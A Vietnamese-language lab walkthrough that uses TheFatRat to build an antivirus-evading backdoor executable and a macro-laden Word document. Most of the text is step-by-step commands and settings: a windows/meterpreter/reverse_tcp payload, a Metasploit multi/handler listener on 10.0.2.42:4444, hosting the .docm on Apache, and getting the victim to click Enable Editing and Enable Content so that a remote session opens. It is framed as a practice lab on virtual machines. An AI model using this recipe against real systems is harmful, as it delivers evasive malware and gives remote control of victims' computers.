# Xâm nhập Windows bằng Tài liệu Office Độc hại sử dụng TheFatRat
TheFatRat là một công cụ khai thác biên dịch malware với payload nổi tiếng, và sau đó malware được biên dịch có thể được thực thi trên Linux, Windows, Mac và Android. TheFatRat cung cấp cách dễ dàng để tạo Backdoor và Payload có thể vượt qua hầu hết các phần mềm diệt virus.

Kho lưu trữ chính thức: https://github.com/Screetsec/TheFatRat

### Mục tiêu
* Cách sử dụng tài liệu office để khai thác máy Windows.

### Yêu cầu
* Máy ảo Windows Server 2016/2012.
* Máy ảo Kali Linux.

## Thiết lập TheFatRat

TheFatRat cung cấp cách dễ dàng để tạo backdoor và payload có thể vượt qua hầu hết các hệ thống diệt virus.

### Thiết lập

1. Chuyển sang máy Kali và mở Terminal.
2. Điều hướng đến thư mục **/opt/**.
`cd /opt`
3. Clone kho lưu trữ github gốc từ FatRat:
`git clone https://github.com/Screetsec/TheFatRat.git`
4. Thay đổi quyền thư mục:
`chmod -R 755 /opt/TheFatRat/`
5. Truy cập thư mục TheFatRat:
`cd TheFatRat/`
6. Thực thi file bash **(setup.sh)** để bắt đầu cài đặt:
`./setup.sh`

Một cửa sổ xterm Updating Kali Repo sẽ hiện ra như hình dưới đây:

![installing-fatRat](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/InstallingFatRat-0.png)


## Tạo File Backdoor
Sau khi cài đặt hoàn tất, trong Terminal, nhập `fatrat` và nhấn enter.

Khi FatRat khởi chạy, bắt đầu xác minh các phụ thuộc đã cài đặt, bạn sẽ nhận được nhiều lời nhắc, chỉ cần nhấn Enter để tiếp tục.

![fatratmenu](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/TheFatRat-1.png)

Trên menu FatRat, chọn **[06] Create Fud Backdoor 1000% with PwnWindws [Excelent]** bằng cách nhập `6`.

![PwnWind](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e0a88cc5a5dc16d3f868e25305588c3f1a4336d2/pwnwind-1.png)

Menu **PwnWinds** xuất hiện như hình trên, chọn **[3] Create exe file with apache + Powershell (FUD 100%) by typing** `3` trong menu.

![payload](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/65ae135c7f8375eb60e15ac0ac936b142562ac66/payload.png)

Đặt `LHOST IP` thành IP Kali của bạn; `LPORT` thành `4444` và output thành `payload` như hình trên.

Tiếp theo, chọn **[3] windows/meterpreter/reverse_tcp** bằng cách nhập `3`.

![payloadchoose](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e68bd00de68fe3b81729e742f4fe28621e93140b/payload-choose.png)

Nếu mọi thứ hoạt động, fatrat sẽ tạo file **payload.exe** nằm trên /root/Fatrat_Generated/ như hình dưới đây:

```
Backdoor Saved To : /root/Fatrat_Generated/payload.exe
```

## Tạo File Word Độc hại
Quay lại menu chính bằng cách chọn **[9] Back to menu**.

Trên menu chính, chọn **[07] Create Backdoor For Office with Microsploit**

![microsploit](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/51c3113f08b47fc83c01fa8a5ff5fc1ed45bb21f/MicroSploit.png)

Trên menu Microsploit, chọn **[2] The Microsoft Office Macro on Windows** bằng cách nhập `2`.

### Các cấu hình tiếp theo sẽ là:

1. `LHOST IP`: [IP Kali của bạn]
2. `LPORT`: 4444
3. `Enter the base name for output files`: EvilDoc
4. `Enter the message for the document body`: you have been PWNED :)
5. Lời nhắc tiếp theo sẽ hỏi bạn có muốn sử dụng file exe tùy chỉnh cho backdoor hay không. Chọn `y` cho **yes**.
6. Chỉ định đường dẫn chính xác đến file payload.exe bạn đã tạo ở đầu lab này: **/root/Fatrat_Generated/payload.exe**
7. Trong Payload Option, chọn **[3] windows/meterpreter/reverse_tcp** bằng cách nhập `3`.
Điều hướng đến thư mục output của FatRat để xem file Word được tạo.

![evilFiles](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c0c8c4ef9ecf358334343d4036a0bb98255272f7/evilFiles.png)

## Thiết lập Listener
Mở một cửa sổ Terminal khác và khởi chạy metasploit bằng cách nhập: `msfconsole`.

Chọn **multi/handler**:
`use multi/handler`

Đặt payload thành **meterpreter/reverse_tcp**:
`set payload windows/meterpreter/reverse_tcp`

Đặt **LHOST** thành IP Kali và **LPORT** thành **4444**:
`set LHOST 10.0.2.42`
`set LPORT 4444`

Nhập **run** để bắt đầu listener:
`run`

## Chia sẻ File Doc Độc hại
Để chia sẻ file độc hại với máy Windows, sao chép file Doc vào thư mục apache. Mở một cửa sổ Terminal mới và nhập:
`cp /root/Fatrat_Generated/EvilDoc.docm /var/www/html/share/`

Sau đó, khởi động dịch vụ apache:
`service apache2 start`

## Mở File Doc Độc hại
Chuyển sang máy Windows và mở **trình duyệt**.

Nhập URL (dựa trên IP Kali của bạn):
`http://10.0.2.42/share/`

Sau đó, tải file doc độc hại bạn đã tạo.

![EvilFile-0](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/evilfile-0.png)

Mở thư mục tải về và nhấp vào file MS Word.

MS Word mở file trong Protected View. Nhấp vào **Enable Editing** như hình dưới đây:

![ms-word-protected-view](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/maliciousword.png)

Nếu bạn nhận được **SECURITY WARNING** do Macro, nhấp vào **Enable Content**.

Bây giờ chuyển lại Kali, nếu mọi thứ hoạt động, bạn sẽ thấy có một **phiên Meterpreter** đang mở trong terminal Metasploit.

![meterpreter-docfile](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/meterpreter-docfile.png)

Bây giờ bạn có thể xem chi tiết hệ thống đã khai thác và v.v. Không chính thức bạn có thể gọi hành động này là 'thành quả' :)
